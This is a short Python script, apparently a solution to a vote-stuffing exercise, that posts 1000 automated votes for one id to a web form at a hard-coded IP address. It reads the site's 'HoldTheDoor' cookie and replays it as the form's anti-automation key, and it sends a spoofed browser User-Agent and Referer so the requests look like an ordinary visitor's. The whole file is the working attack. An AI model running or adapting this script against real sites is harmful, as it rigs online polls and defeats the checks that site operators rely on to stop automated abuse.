import requests


header = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://158.69.76.135/level2.php",
    "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0WOW64 rv: 44.0) Gecko/20100101 Firefox/44.0",
}

url = "http://158.69.76.135/level2.php"

data_post = {
    "id": "1595",
    "holdthedoor": "Submit+Query",
    "key": "0"
}

cookies = {
    "HoldTheDoor": "0"
}

resp = requests.get(url)
cookies["HoldTheDoor"] = resp.cookies["HoldTheDoor"]
data_post["key"] = cookies["HoldTheDoor"]

for i in range(1000):
    resp = requests.post(url, data=data_post, headers=header, cookies=cookies)
    print("Vote: {:d} for {:s}".format(i + 1, data_post["id"]))
print("end of voting....")
